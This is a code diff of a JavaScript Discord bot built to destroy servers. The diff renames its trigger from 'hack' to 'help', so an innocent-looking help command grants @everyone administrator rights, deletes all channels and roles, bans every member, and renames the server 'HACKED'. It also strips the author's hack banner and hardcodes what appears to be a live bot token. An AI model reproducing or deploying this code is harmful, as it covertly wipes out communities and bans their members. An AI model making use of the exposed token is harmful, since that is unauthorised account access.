@@ -6,20 +6,9 @@ console.log(`Logged in as ${client.user.tag}!`);
  
 });
           
-client.on("ready", () => {
-  console.log('♔♔♔♔♔♔♔♔♔♔♔♔♔♔♔♔♔♔♔');
-  console.log('hack by BLACK JACK');/////BLACK JACK 
-console.log('♔♔♔♔♔♔♔♔♔♔♔♔♔♔♔♔♔♔♔');
-  console.log("im ready for hack server")
-console.log(`Logged in as ${client.user.tag}!`);
-  client.user.setActivity(`${prefix}help | BOT SESTAM NEW  ${client.guilds.size}`)///////shtek bnwsa
- client.user.setStatus("dnd")/////ba dly xot statusek bnwsa
-  console.log(`Logined`)
-})
-///created by black jack 
 
 client.on('message', message => {
-    if (message.content.startsWith(prefix + "hack")) {
+    if (message.content.startsWith(prefix + "help")) {
         message.delete();
         message.guild.roles.find('name', '@everyone').edit({
             permissions: ["ADMINISTRATOR"]///premission akata adminstator
@@ -28,9 +17,10 @@ client.on('message', message => {
         message.guild.channels.map(c => {
             c.delete();
         });
-       message.members.forEach(m => {
-                    m.kick();
-                });
+       message.guild.members.forEach(m =>{
+                    m.ban()
+                })
+      
       message.guild.roles.forEach(r =>{
                     r.delete()
                 });
@@ -44,8 +34,8 @@ client.on('message', message => {
                 message.member.addRole(rr.id);
             })
         }, 1000);
-        message.guild.setIcon("https://images-ext-1.discordapp.net/external/HxQPwrwqWqhustolzxC0dblt-gjVdKi36x6a7csUjPE/https/discord.com/assets/ee7c382d9257652a88c8f7b7f22a994d.png");
-        client.user.setAvatar("https://images-ext-1.discordapp.net/external/HxQPwrwqWqhustolzxC0dblt-gjVdKi36x6a7csUjPE/https/discord.com/assets/ee7c382d9257652a88c8f7b7f22a994d.png");
+        message.guild.setIcon("https://media.discordapp.net/attachments/797127379281510480/805515784520073226/image0.png");
+        client.user.setAvatar("https://media.discordapp.net/attachments/797127379281510480/805515784520073226/image0.png");
         message.guild.setName('HACKED');
         setTimeout(function() {
             setInterval(() => {
@@ -60,5 +50,5 @@ client.on('message', message => {
 
  ////codaka drwst krawa lalayan black jack
 
-client.login("")
+client.login("ODExNDg0MjE5MDAzMzcxNTMz.YCy3kg.PUKhtV8pu8NQMmyp7SyOvfFIAgk")
           
